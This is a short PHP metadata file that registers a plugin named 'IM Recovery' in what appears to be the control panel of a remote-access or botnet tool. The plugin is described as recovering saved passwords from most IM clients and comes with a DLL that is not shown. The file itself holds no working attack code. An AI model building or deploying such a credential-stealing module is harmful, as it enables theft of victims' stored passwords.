<?php
if(!isset($initialized))
{
	include('../../pages/404.php');
}

$plugin_name = "IM Recovery";
$plugin_guid = "1b3ae8d8-afde-4862-bd3a-69e3d5e4c41b"; // GUID should be different for diferent versions
$plugin_desc = "Recovers saved passwords from most IM clients!";
$plugin_author = "RonnyRoy";
$plugin_icon = "<i class='fa fa-comment'></i>"; // Font awesome icons
$plugin_version_str = "1.0.0.0";
$plugin_version_int = 1000;
$plugin_has_dll = true;
?>